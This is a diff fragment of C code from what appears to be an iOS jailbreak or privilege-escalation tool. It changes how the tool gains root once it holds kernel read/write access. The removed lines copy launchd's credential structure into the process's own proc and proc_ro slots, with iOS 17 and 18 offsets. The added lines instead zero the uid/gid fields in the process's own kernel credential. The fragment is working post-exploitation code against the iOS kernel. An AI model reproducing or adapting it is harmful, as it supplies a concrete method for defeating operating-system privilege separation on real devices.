@@ -2127,43 +2127,20 @@ bool platformize_proc(void) {
         printf("[*] t_flags@0x3DC=0x%x not plausible (skip TF_PLATFORM write)\n", tf_flags_read);
     }
 
-    // 2. Replace our ucred with launchd's proven ucred.
-    // iOS 18 note: proc->p_ucred (proc+0x10) is the legacy fast-path slot used
-    // by a few BSD helpers, but the LIVE credential that matters for uid/gid
-    // checks is proc_ro->p_ucred (0x20 on iOS 17, 0x28 on iOS 18). Lara writes
-    // both (proc+0x10 + proc_ro+0x20) for iOS 16/17 compat; we additionally
-    // write proc_ro+0x28 to cover iOS 18, which otherwise returns old creds.
-    printf("[elev] finding launchd proc (pid 1)...\n");
-    uint64_t launchdProc = find_proc_by_pid(1);
-    if (!launchdProc) {
-        printf("[-] find_proc_by_pid(1) failed\n");
-        return false;
-    }
-    printf("[elev] launchd proc: 0x%llx\n", launchdProc);
-
-    uint64_t launchdUcred = get_ucred_from_proc(launchdProc);
-    if (!launchdUcred) {
-        printf("[-] Could not read launchd ucred\n");
-        return false;
-    }
-    printf("[elev] launchd ucred: 0x%llx\n", launchdUcred);
-
-    uint64_t ourUcredDirect = kread64(gOurProc + 0x10);
+    // 2a. Read our own real ucred first (we have KRW; no list walking needed).
+    // proc->p_proc_ro (0x18) -> proc_ro->p_ucred (0x20 for <=17.x, 0x28 on 18).
     uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
-    uint64_t ourUcredRo = kread_ptr(ourProcRo + 0x20);
-    uint64_t ourUcredRo18 = kread_ptr(ourProcRo + 0x28);
-    printf("[elev] ours (before): proc+0x10=0x%llx proc_ro.ucred(0x20)=0x%llx (0x28)=0x%llx\n",
-           ourUcredDirect, ourUcredRo, ourUcredRo18);
+    uint64_t ourUcred  = kread_ptr(ourProcRo + 0x28);
+    printf("[elev] ours: proc_ro=0x%llx ucred=0x%llx\n", ourProcRo, ourUcred);
 
-    kwrite64(gOurProc + 0x10, launchdUcred);
-    if (looks_kernel(ourProcRo)) {
-        kwrite64(ourProcRo + 0x20, launchdUcred);   // iOS 17 shadow slot
-        kwrite64(ourProcRo + 0x28, launchdUcred);   // iOS 18 live slot
-        printf("[elev] wrote launchd ucred to proc+0x10, proc_ro+0x20, proc_ro+0x28\n");
-    }
+    // 2b. Zero all POSIX uid/gid words in place. iOS 18 evaluates ucred by
+    // reference (it points INTO this same struct), so writing cr_uid/r-uid/svuid/
+    // -> kuid_t(0) plus cr_rgid/cr_svgid == 0 makes every getuid*() succeed as
+    // root. cr_gid likewise; launchd itself stays untouched.
+    for (uint64_t off = 0x18; off <= 0x2c; off += 4) kwrite32(ourUcred + off, 0);
+    printf("[elev] ucred uid/gid zeroed: uid=%d gid=%d\n", getuid(), getgid());
+    gOurUcred = ourUcred;
 
-    printf("[elev] after: getuid=%d euid=%d\n", getuid(), geteuid());
-    gOurUcred = launchdUcred;
     return true;
 }
 
